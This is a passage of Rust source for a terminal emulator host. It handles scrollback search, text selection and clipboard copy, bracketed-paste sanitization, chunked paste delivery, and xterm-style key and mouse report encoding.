            | KeyCode::Char('\'')
            | KeyCode::Char('"')
            | KeyCode::Char('.')
            | KeyCode::Char('>')
    )
}

fn handle_find_key(
    key: KeyEvent,
    find: &mut FindMode,
    selection: &mut Selection,
    view_scroll: &mut usize,
    emulator: &Emulator,
) -> Result<bool> {
    match key.code {
        KeyCode::Esc => {
            find.active = false;
            find.query.clear();
            find.last = None;
            find.rank = None;
            selection.clear();
            Ok(true)
        }
        // Shift+Enter / Shift+F3 → previous; plain Enter / F3 → next.
        KeyCode::Enter | KeyCode::F(3)
            if key.modifiers.contains(KeyModifiers::SHIFT)
                && !key.modifiers.contains(KeyModifiers::CONTROL)
                && !key.modifiers.contains(KeyModifiers::ALT) =>
        {
            apply_find_step(find, selection, view_scroll, emulator, true);
            Ok(true)
        }
        KeyCode::Enter | KeyCode::F(3) => {
            apply_find_step(find, selection, view_scroll, emulator, false);
            Ok(true)
        }
        KeyCode::Backspace => {
            find.query.pop();
            find.last = None;
            find.rank = None;
            // Re-seek first match for remaining query.
            if find.query.is_empty() {
                selection.clear();
            } else {
                apply_find_step(find, selection, view_scroll, emulator, false);
            }
            Ok(true)
        }
        KeyCode::Char(c)
            if !key.modifiers.contains(KeyModifiers::CONTROL)
                && !key.modifiers.contains(KeyModifiers::ALT)
                && !c.is_control() =>
        {
            find.query.push(c);
            find.last = None;
            find.rank = None;
            // Live first-match as you type (when non-empty).
            if !find.query.is_empty() {
                apply_find_step(find, selection, view_scroll, emulator, false);
            }
            Ok(true)
        }
        _ => Ok(false),
    }
}

/// Apply forward (`reverse = false`) or backward find; case-insensitive.
fn apply_find_step(
    find: &mut FindMode,
    selection: &mut Selection,
    view_scroll: &mut usize,
    emulator: &Emulator,
    reverse: bool,
) {
    if find.query.is_empty() {
        find.rank = None;
        return;
    }
    let m = if reverse {
        let before = find.last.map(|h| (h.abs_row, h.start_col));
        emulator
            .screen()
            .find_in_history_rev(&find.query, before, false)
    } else {
        let after = find.last.map(|h| (h.abs_row, h.end_col));
        emulator.screen().find_in_history(&find.query, after)
    };
    let Some(m) = m else {
        // Wrap already attempted inside find; clear selection on miss.
        selection.clear();
        find.last = None;
        find.rank = None;
        return;
    };
    find.last = Some(m);
    find.rank = emulator.screen().history_match_rank(&find.query, m, false);
    *view_scroll = emulator.screen().view_scroll_for_history_row(m.abs_row);
    // Selection is absolute history rows (same coordinate as find match).
    selection.set_range(m.abs_row, m.start_col, m.abs_row, m.end_col);
    selection.dragged = true;
}

fn paint_find_prompt(
    rows: usize,
    cols: usize,
    query: &str,
    rank: Option<(usize, usize)>,
    reserve_chip: bool,
) -> Result<()> {
    use std::io::Write as _;
    if rows == 0 || cols == 0 {
        return Ok(());
    }
    // Leave room for scroll chip on the right when both show (chip paints after).
    let chip_reserve = if reserve_chip { 14usize } else { 0 };
    let field = cols.saturating_sub(chip_reserve).max(1).min(cols);
    let mut label = match rank {
        Some((i, n)) => format!(" Find: {query}█ {i}/{n}"),
        None if query.is_empty() => " Find: █".to_string(),
        None => format!(" Find: {query}█ 0/0"),
    };
    if label.chars().count() > field {
        label = label.chars().take(field).collect();
    } else {
        // Pad so shortening the query overwrites stale inverse glyphs without CSI K
        // (full-row EL would erase the chip region before chip repaint).
        while label.chars().count() < field {
            label.push(' ');
        }
    }
    let mut out = io::stdout().lock();
    write!(out, "\x1b[{rows};1H\x1b[7m{label}\x1b[0m").context("paint find prompt")?;
    if !reserve_chip && field < cols {
        // Live (unscrolled) find: clear the rest of the bottom row.
        write!(out, "\x1b[0K").context("clear after find prompt")?;
    }
    out.flush().context("flush find prompt")?;
    Ok(())
}

/// Outer-window title so dogfood hosts show when Prismattyc is in history view.
fn sync_host_title(view_scroll: usize, max_scroll: usize, new_output: bool) {
    use std::io::Write as _;
    let mut out = io::stdout().lock();
    if view_scroll == 0 || max_scroll == 0 {
        let _ = write!(out, "\x1b]0;prismattyc\x07");
    } else if new_output {
        let _ = write!(
            out,
            "\x1b]0;prismattyc — scroll {view_scroll}/{max_scroll} · new\x07"
        );
    } else {
        let _ = write!(
            out,
            "\x1b]0;prismattyc — scroll {view_scroll}/{max_scroll}\x07"
        );
    }
    let _ = out.flush();
}

/// Inverse status chip at bottom-right of the outer frame while in history view.
/// Host-only chrome (does not mutate the child grid / scrollback).
fn paint_scroll_status_chrome(
    rows: usize,
    cols: usize,
    scroll: usize,
    max_scroll: usize,
    new_output: bool,
) -> Result<()> {
    use std::io::Write as _;
    if rows == 0 || cols == 0 || scroll == 0 {
        return Ok(());
    }
    let label = if new_output {
        format!(" {scroll}/{max_scroll} · new ")
    } else {
        format!(" {scroll}/{max_scroll} ")
    };
    let label_cols = label.chars().count().min(cols);
    let label: String = label.chars().take(label_cols).collect();
    let start_col = cols.saturating_sub(label_cols).saturating_add(1).max(1);
    let mut out = io::stdout().lock();
    // CUP to bottom-right region, inverse SGR, label, reset (no caret restore needed).
    write!(out, "\x1b[{rows};{start_col}H\x1b[7m{label}\x1b[0m")
        .context("paint scroll status chrome")?;
    out.flush().context("flush scroll status chrome")?;
    Ok(())
}

/// Host copy chords. `has_selection` enables Ctrl+C → copy (not interrupt).
fn is_copy_chord(key: KeyEvent, has_selection: bool) -> bool {
    if !key.modifiers.contains(KeyModifiers::CONTROL) {
        return false;
    }
    if !matches!(key.code, KeyCode::Char('c') | KeyCode::Char('C')) {
        return false;
    }
    // Ctrl+Shift+C always (when the outer host lets us see it).
    if key.modifiers.contains(KeyModifiers::SHIFT) {
        return true;
    }
    // Ctrl+C with a multi-cell host selection → copy; without → interrupt.
    // Callers pass `selection_claims_ctrl_c` so one-cell marks do not steal ^C.
    has_selection && !key.modifiers.contains(KeyModifiers::ALT)
}

/// Whether Ctrl+C should copy rather than interrupt (text selection D-H4).
///
/// A pure one-cell mark from Ctrl+Space (`dragged` with anchor == free end) is
/// paintable for inverse chrome but does **not** count as a copyable selection
/// for the Ctrl+C fallback chord. Multi-cell ranges (mouse drag, Shift+arrow,
/// mark then extend) claim the chord.
fn selection_claims_ctrl_c(selection: &Selection) -> bool {
    let Some(range) = selection.range() else {
        return false;
    };
    range.start_row != range.end_row || range.start_col != range.end_col
}

/// Ctrl+Shift+A — select entire viewport (text selection D-H2). Not plain Ctrl+A.
fn is_select_all_chord(key: KeyEvent) -> bool {
    key.modifiers.contains(KeyModifiers::CONTROL)
        && key.modifiers.contains(KeyModifiers::SHIFT)
        && !key.modifiers.contains(KeyModifiers::ALT)
        && matches!(key.code, KeyCode::Char('a') | KeyCode::Char('A'))
}

fn copy_selection_osc52(
    selection: &Selection,
    emulator: &Emulator,
    _view_scroll: usize,
) -> Result<()> {
    let Some(range) = selection.range() else {
        return Ok(());
    };
    // Selection rows are absolute history indices (scrollback-inclusive).
    let text = emulator.screen().extract_text_abs(range);
    if let Some(osc) = encode_osc52_clipboard(&text) {
        let mut out = io::stdout().lock();
        out.write_all(&osc).context("write OSC 52 clipboard")?;
        out.flush()?;
    }
    Ok(())
}

fn is_selection_motion_code(code: KeyCode) -> bool {
    matches!(
        code,
        KeyCode::Left
            | KeyCode::Right
            | KeyCode::Up
            | KeyCode::Down
            | KeyCode::Home
            | KeyCode::End
            | KeyCode::PageUp
            | KeyCode::PageDown
    )
}

/// Host-local selection motion: Shift+key always; plain key while select mode is on.
fn is_selection_motion(key: KeyEvent, keyboard_select_mode: bool) -> bool {
    if !is_selection_motion_code(key.code) {
        return false;
    }
    if keyboard_select_mode {
        return true;
    }
    // SHIFT required to *enter* selection via motion keys alone.
    key.modifiers.intersects(KeyModifiers::SHIFT)
}

/// Path for `PRISMATTYC_KEY_DEBUG` append log.
///
/// Order: explicit `PRISMATTYC_KEY_DEBUG_PATH` → `$XDG_RUNTIME_DIR/prism/keys-<pid>.log`
/// → `$TMPDIR/prism-keys-<user>-<pid>.log`. Never a fixed world-writable
/// `/tmp/prism-keys.log` (shared-host footgun).
fn key_debug_log_path() -> std::path::PathBuf {
    if let Ok(p) = env::var("PRISMATTYC_KEY_DEBUG_PATH") {
        let p = p.trim();
        if !p.is_empty() {
            return std::path::PathBuf::from(p);
        }
    }
    let pid = std::process::id();
    if let Ok(runtime) = env::var("XDG_RUNTIME_DIR") {
        if !runtime.is_empty() {
            return std::path::Path::new(&runtime)
                .join("prism")
                .join(format!("keys-{pid}.log"));
        }
    }
    let tmp = env::var("TMPDIR")
        .ok()
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "/tmp".into());
    let user = env::var("USER")
        .ok()
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "user".into());
    std::path::Path::new(&tmp).join(format!("prism-keys-{user}-{pid}.log"))
}

fn log_key_debug(key: &KeyEvent) {
    use std::io::Write as _;
    let line = format!(
        "code={:?} mods={:?} kind={:?}\n",
        key.code, key.modifiers, key.kind
    );
    let path = key_debug_log_path();
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let _ = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .and_then(|mut f| f.write_all(line.as_bytes()));
}

/// Extend (or start) selection from the caret / free end (absolute history rows).
fn extend_selection_keyboard(
    selection: &mut Selection,
    emulator: &Emulator,
    code: KeyCode,
    view_scroll: &mut usize,
) -> bool {
    let cols = emulator.screen().columns();
    let rows = emulator.screen().rows();
    if cols == 0 || rows == 0 {
        return false;
    }
    let max_abs = emulator.screen().history_line_count().saturating_sub(1);
    if selection.range().is_none() {
        let caret = emulator.screen().cursor();
        // Live caret → absolute (scrollback.len() + row when not alt).
        let abs = emulator.screen().abs_row_at_view(0, caret.row);
        selection.begin(abs, caret.column);
    } else {
        // Re-open free end so `update` applies after a finished mouse drag.
        selection.active = true;
    }
    let free = selection.cursor.unwrap_or_else(|| {
        let c = emulator.screen().cursor();
        prismattyc_core::Cursor {
            row: emulator.screen().abs_row_at_view(0, c.row),
            column: c.column,
        }
    });
    let (mut row, mut col) = (free.row, free.column);
    let page = rows.saturating_sub(1).max(1);
    match code {
        KeyCode::Left => col = col.saturating_sub(1),
        KeyCode::Right => col = (col + 1).min(cols - 1),
        KeyCode::Up => row = row.saturating_sub(1),
        KeyCode::Down => row = (row + 1).min(max_abs),
        KeyCode::Home => col = 0,
        KeyCode::End => col = cols - 1,
        KeyCode::PageUp => row = row.saturating_sub(page),
        KeyCode::PageDown => row = (row + page).min(max_abs),
        _ => return false,
    }
    selection.update(row, col);
    selection.dragged = true;
    // Keep free end visible when selection walks into history.
    *view_scroll = emulator.screen().view_scroll_for_history_row(row);
    true
}

/// Strip every layer of bracketed-paste wrappers from host paste text.
///
/// Outer hosts (Ghostty/Kitty/herdr) may wrap paste for Prismattyc (`Event::Paste`).
/// Crossterm removes **one** `\e[200~…\e[201~` layer when parsing. Nested hosts
/// or a second wrap leave an **inner** layer inside the string. If we then wrap
/// again for the child, bash sees double brackets and treats `^[[200~…` as
/// literal text (classic Ghostty dogfood leak). Neutralize **all** `\e[200~` /
/// `\e[201~` in the payload (including rejoined fragments) so re-wrapping
/// cannot be broken out of. Wrap **once** only when the child has
/// DECSET 2004.
///
/// Algorithm is strict **O(n)** in the capped input size: truncate first, then
/// scan left-to-right once. Complete START/END matches in the input are
/// skipped; every other byte is pushed to an output buffer. After each push,
/// while the buffer **ends with** START or END, that delimiter is popped.
/// Suffix pops catch the synthesis pattern
/// (`"\x1b[20" + END + "1~"` → rejoin to END) without a multi-pass fixed-point
/// `replace` loop (which is O(n²) / event-loop DoS under depth-N nesting).
fn normalize_paste_text(text: &str) -> String {
    const START: &[u8] = b"\x1b[200~";
    const END: &[u8] = b"\x1b[201~";

    // Cap **before** work (host event-loop DoS). UTF-8 safe.
    let text = if text.len() > MAX_PASTE_BYTES {
        let mut end = MAX_PASTE_BYTES;
        while end > 0 && !text.is_char_boundary(end) {
            end -= 1;
        }
        &text[..end]
    } else {
        text
    };

    let input = text.as_bytes();
    let mut out = Vec::with_capacity(input.len());
    let mut i = 0;
    while i < input.len() {
        if input[i..].starts_with(START) {
            i += START.len();
            continue;
        }
        if input[i..].starts_with(END) {
            i += END.len();
            continue;
        }
        out.push(input[i]);
        i += 1;
        // Pop delimiters formed at the suffix (direct append or rejoin after a
        // mid-stream skip). Each byte is pushed and popped at most once → O(n).
        loop {
            let n = out.len();
            if n >= START.len() && &out[n - START.len()..] == START {
                out.truncate(n - START.len());
                continue;
            }
            if n >= END.len() && &out[n - END.len()..] == END {
                out.truncate(n - END.len());
                continue;
            }
            break;
        }
    }

    // Only ASCII delimiter bytes were removed from valid UTF-8 input.
    String::from_utf8(out).unwrap_or_else(|e| String::from_utf8_lossy(&e.into_bytes()).into_owned())
}

/// Queue encoded keyboard bytes into a bounded burst. The caller flushes the
/// burst at non-key boundaries or when it reaches the hard size limit.
fn queue_key_bytes(pending: &mut Vec<u8>, bytes: Vec<u8>, to_child: &mpsc::SyncSender<ChildWrite>) {
    if bytes.is_empty() {
        return;
    }
    if !pending.is_empty() && pending.len() + bytes.len() > KEY_BURST_MAX_BYTES {
        flush_pending_key_bytes(pending, to_child);
    }
    pending.extend_from_slice(&bytes);
    if pending.len() >= KEY_BURST_MAX_BYTES {
        flush_pending_key_bytes(pending, to_child);
    }
}

/// Submit one coalesced key burst with one bounded wall-clock budget.
fn flush_pending_key_bytes(pending: &mut Vec<u8>, to_child: &mpsc::SyncSender<ChildWrite>) {
    if pending.is_empty() {
        return;
    }
    let bytes = std::mem::take(pending);
    let deadline = Instant::now() + KEY_SEND_BUDGET;
    if try_send_chunk_until(to_child, bytes, deadline).is_err() {
        signal_child_enqueue_failure();
    }
}

/// Result of enqueueing a host paste toward the child PTY.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PasteEnqueueResult {
    /// All paste bytes were queued (or the paste was empty).
    Queued,
    /// Some but not all chunks were queued before the budget/queue failed.
    Partial,
    /// Nothing was queued (queue full / disconnected for the whole budget).
    Dropped,
}

/// Deliver host paste to the child, wrapping when the child enabled DECSET 2004.
///
/// Host paste uses the existing chunked polled `try_send` path under
/// `PASTE_SEND_BUDGET` so mild host→child backpressure does not silently drop
/// the entire clipboard payload. Key bursts use a separate coalesced message
/// and budget; their ordering is flushed at every non-key boundary. On
/// `Partial`/`Dropped`, ring BEL on the outer host so the failure is user-visible
/// (text selection paste path). Never blocks forever.
/// `normalize_paste_text` truncates to MAX_PASTE_BYTES before scanning.
fn handle_paste(
    text: &str,
    child_wants_bracketed: bool,
    to_child: &mpsc::SyncSender<ChildWrite>,
) -> PasteEnqueueResult {
    let payload = normalize_paste_text(text);
    let bytes = if child_wants_bracketed {
        let mut out = Vec::with_capacity(payload.len() + 12);
        out.extend_from_slice(b"\x1b[200~");
        out.extend_from_slice(payload.as_bytes());
        out.extend_from_slice(b"\x1b[201~");
        out
    } else {
        payload.into_bytes()
    };

    let result = enqueue_paste_chunks(to_child, &bytes, PASTE_SEND_BUDGET);

    // If we entered bracketed paste but did not deliver the full stream, try to
    // emit the terminator so the child does not stay stuck in paste mode.
    if child_wants_bracketed && matches!(result, PasteEnqueueResult::Partial) {
        let close_deadline = std::time::Instant::now() + PASTE_BRACKET_CLOSE_TIMEOUT;
        let _ = try_send_chunk_until(to_child, b"\x1b[201~".to_vec(), close_deadline);
    }

    if matches!(
        result,
        PasteEnqueueResult::Partial | PasteEnqueueResult::Dropped
    ) {
        signal_child_enqueue_failure();
    }
    result
}

/// Chunk `bytes` onto `to_child` with a wall-clock budget.
///
/// Polls `try_send` so a full queue can drain as the writer thread consumes,
/// without unbounded blocking and without unstable `send_timeout`.
fn enqueue_paste_chunks(
    to_child: &mpsc::SyncSender<ChildWrite>,
    bytes: &[u8],
    budget: Duration,
) -> PasteEnqueueResult {
    if bytes.is_empty() {
        return PasteEnqueueResult::Queued;
    }

    let deadline = std::time::Instant::now() + budget;
    let mut offset = 0;
    let mut any_queued = false;

    while offset < bytes.len() {
        let end = (offset + PASTE_CHUNK_BYTES).min(bytes.len());
        let chunk = bytes[offset..end].to_vec();
        match try_send_chunk_until(to_child, chunk, deadline) {
            Ok(()) => {
                any_queued = true;
                offset = end;
            }
            Err(TrySendChunkError::Disconnected) | Err(TrySendChunkError::TimedOut) => {
                return if any_queued {
                    PasteEnqueueResult::Partial
                } else {
                    PasteEnqueueResult::Dropped
                };
            }
        }
    }
    PasteEnqueueResult::Queued
}

#[derive(Debug)]
enum TrySendChunkError {
    TimedOut,
    Disconnected,
}

/// Poll `try_send` until the chunk is queued, the peer disconnects, or `deadline`.
fn try_send_chunk_until(
    to_child: &mpsc::SyncSender<ChildWrite>,
    mut chunk: Vec<u8>,
    deadline: std::time::Instant,
) -> Result<(), TrySendChunkError> {
    loop {
        match to_child.try_send(ChildWrite::bytes(chunk)) {
            Ok(()) => return Ok(()),
            Err(mpsc::TrySendError::Disconnected(_)) => {
                return Err(TrySendChunkError::Disconnected);
            }
            Err(mpsc::TrySendError::Full(returned)) => {
                chunk = returned.bytes;
                let now = std::time::Instant::now();
                if now >= deadline {
                    return Err(TrySendChunkError::TimedOut);
                }
                let left = deadline.saturating_duration_since(now);
                thread::sleep(left.min(PASTE_POLL_INTERVAL));
            }
        }
    }
}

/// User-visible signal when host input could not be fully delivered to the child.
/// BEL on the outer host terminal — does not write to the child PTY.
fn signal_child_enqueue_failure() {
    let mut out = io::stdout();
    let _ = out.write_all(b"\x07");
    let _ = out.flush();
}

/// Multi-click detector for word/line select (text selection D-H2). Original logic.
#[derive(Debug, Default)]
struct MultiClick {
    last_at: Option<std::time::Instant>,
    row: usize,
    col: usize,
    /// 1 = cell, 2 = word, 3 = line (cycles).
    count: u8,
}

const MULTI_CLICK_MS: u128 = 500;

impl MultiClick {
    fn on_left_down(&mut self, row: usize, col: usize) -> u8 {
        let now = std::time::Instant::now();
        let same = self.last_at.is_some_and(|t| {
            now.duration_since(t).as_millis() <= MULTI_CLICK_MS
                && self.row == row
                && self.col == col
        });
        self.count = if same {
            match self.count {
                1 => 2,
                2 => 3,
                _ => 1,
            }
        } else {
            1
        };
        self.last_at = Some(now);
        self.row = row;
        self.col = col;
        self.count
    }
}

/// Host mouse with hybrid app reporting (mouse input).
///
/// - App tracking **off** → host selection / scrollback pan (ADR-0002 path).
/// - Tracking **on** + **Shift** → host selection (and Shift+wheel page pan).
/// - Tracking **on** + plain → SGR/X10 report to the child PTY.
#[allow(clippy::too_many_arguments)] // single host input routing site
fn handle_mouse(
    mouse: MouseEvent,
    selection: &mut Selection,
    multi_click: &mut MultiClick,
    keyboard_select_mode: &mut bool,
    view_scroll: &mut usize,
    emulator: &Emulator,
    to_child: &mpsc::SyncSender<ChildWrite>,
    edge_pan: &mut EdgePanDrag,
) -> Result<bool> {
    let tracking = emulator.mouse_tracking();
    let shift = mouse.modifiers.contains(KeyModifiers::SHIFT);

    // mouse input: plain mouse while tracking is on → application report, not host
    // selection. Shift keeps the host path (including on alt screen).
    if tracking.is_on() && !shift {
        edge_pan.clear();
        if let Some(report) = encode_mouse_report(mouse, emulator) {
            // Drop host selection chrome so plain app clicks do not leave a
            // sticky range that would steal Ctrl+C (text selection).
            let had = selection.range().is_some()
                || selection.active
                || selection.dragged
                || *keyboard_select_mode;
            selection.clear();
            *keyboard_select_mode = false;
            if emulator.screen().alt_active() {
                *view_scroll = 0;
            }
            let _ = to_child.try_send(ChildWrite::bytes(report));
            return Ok(had);
        }
        // Event filtered by tracking level (e.g. bare Moved under Click) —
        // still not host selection.
        return Ok(false);
    }

    // Host path: tracking off, or Shift override while tracking is on.
    // Alt screen: refuse host selection unless Shift hybrid override (mouse input).
    // Wheel does not pan primary history while alt is active.
    if emulator.screen().alt_active() && !shift {
        edge_pan.clear();
        let had = selection.range().is_some()
            || selection.active
            || selection.dragged
            || *keyboard_select_mode;
        selection.clear();
        *keyboard_select_mode = false;
        *view_scroll = 0;
        return Ok(had);
    }
    if emulator.screen().alt_active() && shift {
        // Shift+select on alt is intentional hybrid host path; still force live view.
        *view_scroll = 0;
    }

    // mouse wheel pans host scrollback view (primary only).
    // Plain wheel ≈ 3 rows; Shift+wheel ≈ one page (first-class terminal feel).
    // When tracking is on, plain wheel already went to the child above.
    match mouse.kind {
        MouseEventKind::ScrollUp | MouseEventKind::ScrollDown => {
            if emulator.screen().alt_active() {
                return Ok(false);
            }
            let max = emulator.screen().max_view_scroll();
            let page = emulator.screen().rows().saturating_sub(1).max(1);
            let step = if shift { page } else { 3 };
            let before = *view_scroll;
            if matches!(mouse.kind, MouseEventKind::ScrollUp) {
                *view_scroll = (*view_scroll).saturating_add(step).min(max);
            } else {
                *view_scroll = view_scroll.saturating_sub(step);
            }
            if *view_scroll != before {
                selection.clear();
                *keyboard_select_mode = false;
                return Ok(true);
            }
            return Ok(false);
        }
        _ => {}
    }

    let cols = emulator.screen().columns();
    let rows = emulator.screen().rows();
    let col = (mouse.column as usize).min(cols.saturating_sub(1));
    let view_row = (mouse.row as usize).min(rows.saturating_sub(1));
    let scroll = (*view_scroll).min(emulator.screen().max_view_scroll());
    // Absolute history row for this viewport cell (scrollback-inclusive select).
    let abs_at = |scroll: usize, vr: usize| emulator.screen().abs_row_at_view(scroll, vr);

    match mouse.kind {
        MouseEventKind::Down(MouseButton::Left) => {
            // Mouse selection takes over; leave keyboard-select mode.
            *keyboard_select_mode = false;
            edge_pan.note_pointer(view_row, col, rows);
            edge_pan.last_tick = None;
            edge_pan.ticks_at_edge = 0;
            let clicks = multi_click.on_left_down(view_row, col);
            match clicks {
                2 => {
                    if let Some(r) = emulator.screen().word_range_at_view(scroll, view_row, col) {
                        let a0 = abs_at(scroll, r.start_row);
                        let a1 = abs_at(scroll, r.end_row);
                        selection.set_range(a0, r.start_col, a1, r.end_col);
                    } else {
                        selection.begin(abs_at(scroll, view_row), col);
                    }
                }
                3 => {
                    if let Some(r) = emulator.screen().line_range_at(view_row) {
                        let a = abs_at(scroll, r.start_row);
                        selection.set_range(a, r.start_col, a, r.end_col);
                    } else {
                        selection.begin(abs_at(scroll, view_row), col);
                    }
                }
                _ => {
                    selection.begin(abs_at(scroll, view_row), col);
                }
            }
            Ok(true)
        }
        MouseEventKind::Drag(MouseButton::Left) => {
            *keyboard_select_mode = false;
            edge_pan.note_pointer(view_row, col, rows);
            // Drag at edge: same progressive pan as hold-still tick().
            if !emulator.screen().alt_active() {
                let at_top = view_row == 0;
                let at_bottom = view_row + 1 >= rows;
                if at_top || at_bottom {
                    let (_, interval) = edge_pan_profile(edge_pan.ticks_at_edge);
                    let due = edge_pan
                        .last_tick
                        .map(|t| t.elapsed() >= interval)
                        .unwrap_or(true);
                    if due {
                        let _ = edge_pan.pan_once(selection, view_scroll, emulator, at_top);
                    }
                }
            }
            let scroll = (*view_scroll).min(emulator.screen().max_view_scroll());
            let abs_row = abs_at(scroll, view_row);
            if selection.anchor.is_none() {
                selection.begin(abs_row, col);
                selection.dragged = true;
                return Ok(true);
            }
            if !selection.active && selection.dragged {
                selection.active = true;
            }
            selection.update(abs_row, col);
            selection.dragged = true;
            Ok(true)
        }
        MouseEventKind::Up(MouseButton::Left) => {
            *keyboard_select_mode = false;
            edge_pan.clear();
            let abs_row = abs_at(scroll, view_row);
            if selection.active {
                selection.update(abs_row, col);
            }
            if !selection.dragged {
                selection.clear();
                return Ok(true);
            }
            selection.finish();
            copy_selection_osc52(selection, emulator, *view_scroll)?;
            Ok(true)
        }
        _ => Ok(false),
    }
}

/// Encode a crossterm mouse event as an application mouse report (mouse input).
///
/// Returns `None` when tracking is off or the event is filtered by tracking level.
fn encode_mouse_report(mouse: MouseEvent, emulator: &Emulator) -> Option<Vec<u8>> {
    use prismattyc_emulator::MouseTracking;

    let tracking = emulator.mouse_tracking();
    if !tracking.is_on() {
        return None;
    }

    let cols = emulator.screen().columns();
    let rows = emulator.screen().rows();
    // SGR / X10 use 1-based cell coordinates.
    let cx = (mouse.column as usize).min(cols.saturating_sub(1)) + 1;
    let cy = (mouse.row as usize).min(rows.saturating_sub(1)) + 1;

    let (base, is_release, is_motion) = match mouse.kind {
        MouseEventKind::Down(btn) => (mouse_button_code(btn)?, false, false),
        MouseEventKind::Up(btn) => (mouse_button_code(btn)?, true, false),
        MouseEventKind::Drag(btn) => {
            if !tracking.reports_drag() {
                return None;
            }
            (mouse_button_code(btn)?, false, true)
        }
        MouseEventKind::Moved => {
            if !tracking.reports_motion() {
                return None;
            }
            // Bare motion: button code 3 (+32 motion) in xterm convention.
            (3u8, false, true)
        }
        MouseEventKind::ScrollUp => (64u8, false, false),
        MouseEventKind::ScrollDown => (65u8, false, false),
        // Horizontal wheel: not claimed; drop.
        _ => return None,
    };

    // Filter click-only level: no drag/motion (wheel always reported).
    if matches!(tracking, MouseTracking::Click) && is_motion {
        return None;
    }

    let mut cb = base;
    if is_motion && base < 64 {
        cb += 32;
    }
    // For app reports, Shift is the host override — callers only encode when
    // Shift is *not* held. Still encode Alt/Ctrl if present.
    if mouse.modifiers.contains(KeyModifiers::ALT) {
        cb += 8;
    }
    if mouse.modifiers.contains(KeyModifiers::CONTROL) {
        cb += 16;
    }

    if emulator.mouse_sgr() {
        let final_byte = if is_release { b'm' } else { b'M' };
        Some(format!("\x1b[<{cb};{cx};{cy}{}", final_byte as char).into_bytes())
    } else {
        // Legacy X10: ESC [ M Cb+32 Cx+32 Cy+32, coords clamped to 223.
        let enc_b = cb.saturating_add(32);
        let enc_x = (cx.min(223) as u8).saturating_add(32);
        let enc_y = (cy.min(223) as u8).saturating_add(32);
        // X10 encodes release as button 3 (no separate release bit).
        let enc_b = if is_release {
            3u8.saturating_add(32)
        } else {
            enc_b
        };
        Some(vec![0x1b, b'[', b'M', enc_b, enc_x, enc_y])
    }
}

fn mouse_button_code(button: MouseButton) -> Option<u8> {
    match button {
        MouseButton::Left => Some(0),
        MouseButton::Middle => Some(1),
        MouseButton::Right => Some(2),
    }
}

/// Encode a host key event into bytes for the child PTY.
///
/// Called only after host selection / mark / copy chords decline the key, so
/// Shift+arrows used for selection never reach this path.
///
/// Function keys use a consistent xterm-ish set (not the CSI 11~…14~ alternate):
/// - F1–F4: SS3 forms `\x1bOP` … `\x1bOS`
/// - F5–F12: CSI `~` forms `\x1b[15~` … `\x1b[24~` (xterm skips 16 and 22)
///
/// Alt+printable char → ESC prefix (readline Meta-b / Meta-f style).
/// Ctrl+Left / Ctrl+Right → CSI modified-arrow `\x1b[1;5D` / `\x1b[1;5C`.
/// xterm / modifyOtherKeys modifier parameter:
/// `1 + shift*1 + alt*2 + ctrl*4 + super*8` (none → 1; not encoded for plain keys).
fn xterm_mod_param(modifiers: KeyModifiers) -> u8 {
    let mut m = 1u8;
    if modifiers.contains(KeyModifiers::SHIFT) {
        m += 1;
    }
    if modifiers.contains(KeyModifiers::ALT) {
        m += 2;
    }
    if modifiers.contains(KeyModifiers::CONTROL) {
        m += 4;
    }
    if modifiers.contains(KeyModifiers::SUPER) {
        m += 8;
    }
    m
}

/// CSI 27 ; mod ; unicode ~  (xterm modifyOtherKeys style for modified printables).
fn encode_csi27_char(c: char, modifiers: KeyModifiers) -> Vec<u8> {
    let mod_p = xterm_mod_param(modifiers);
    let code = u32::from(c);
    format!("\x1b[27;{mod_p};{code}~").into_bytes()
}

/// CSI form with optional modifier.
///
/// - **Cursor/Home/End** (`prefix == "1"`): plain is `\x1b[{final}` (no `1`);
///   modified is `\x1b[1;{mod}{final}` (xterm).
/// - **Tilde keys** (Page/Delete/Insert): plain `\x1b[{n}~`; modified
///   `\x1b[{n};{mod}~`.
fn encode_csi_modified(prefix: &str, final_byte: u8, modifiers: KeyModifiers) -> Vec<u8> {
    let mod_p = xterm_mod_param(modifiers);
    if mod_p == 1 {
        if prefix == "1" && final_byte != b'~' {
            // Plain cursor / Home / End: CSI letter only.
            return vec![0x1b, b'[', final_byte];
        }
        let mut out = Vec::with_capacity(3 + prefix.len());
        out.extend_from_slice(b"\x1b[");
        out.extend_from_slice(prefix.as_bytes());
        out.push(final_byte);
        out
    } else if prefix == "1" && final_byte != b'~' {
        format!("\x1b[1;{mod_p}{}", final_byte as char).into_bytes()
    } else {
        // `\x1b[{prefix};{mod}{final}` e.g. `\x1b[5;5~`
        format!("\x1b[{prefix};{mod_p}{}", final_byte as char).into_bytes()
    }
}

/// Encode a host key for the child PTY.
///
/// `kitty_flags` is the active Kitty progressive-enhancement bitmask (0 = legacy).
fn encode_key_to_pty(key: KeyEvent, kitty_flags: u16) -> Option<Vec<u8>> {
    if kitty_flags != 0 {
        return encode_key_kitty(key, kitty_flags);
    }
    encode_key_legacy(key)
}

fn encode_key_legacy(key: KeyEvent) -> Option<Vec<u8>> {
    match key.code {
        // Shift+Tab → CSI Z (BTAB).
        KeyCode::BackTab => Some(b"\x1b[Z".to_vec()),
        KeyCode::Char(c) => encode_char_key(c, key.modifiers),
        KeyCode::Enter => {
            if xterm_mod_param(key.modifiers) != 1 {
                Some(encode_csi27_char('\r', key.modifiers))
            } else {
                Some(vec![b'\r'])
            }
        }
        KeyCode::Backspace => {
            if xterm_mod_param(key.modifiers) != 1 {
                // DEL 127 with modifiers via CSI 27.
                Some(encode_csi27_char('\u{007f}', key.modifiers))
            } else {
                Some(vec![0x7f])
            }
        }
        KeyCode::Tab => {
            if key.modifiers.contains(KeyModifiers::SHIFT) {
                Some(b"\x1b[Z".to_vec())
            } else if xterm_mod_param(key.modifiers) != 1 {
                Some(encode_csi27_char('\t', key.modifiers))
            } else {
                Some(vec![b'\t'])
            }
        }
        KeyCode::Esc => Some(vec![0x1b]),
        // Cursor keys: plain CSI letter, or CSI 1;mod letter (remainder).
        // Host Shift+selection intercepts before encode when selection owns Shift.
        KeyCode::Up => Some(encode_csi_modified("1", b'A', key.modifiers)),
        KeyCode::Down => Some(encode_csi_modified("1", b'B', key.modifiers)),
